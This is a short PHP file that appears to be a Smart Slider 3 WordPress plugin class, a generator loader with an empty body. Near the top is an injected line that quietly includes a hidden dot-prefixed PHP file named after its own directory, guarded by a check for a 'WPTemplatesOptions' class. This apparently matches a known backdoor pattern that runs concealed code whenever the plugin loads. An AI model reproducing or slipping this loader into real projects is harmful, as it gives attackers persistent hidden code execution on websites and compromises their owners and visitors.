<?php

namespace Nextend\SmartSlider3\Generator\Common;

use Nextend\SmartSlider3\Generator\AbstractGeneratorLoader;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class GeneratorCommonLoader extends AbstractGeneratorLoader {

}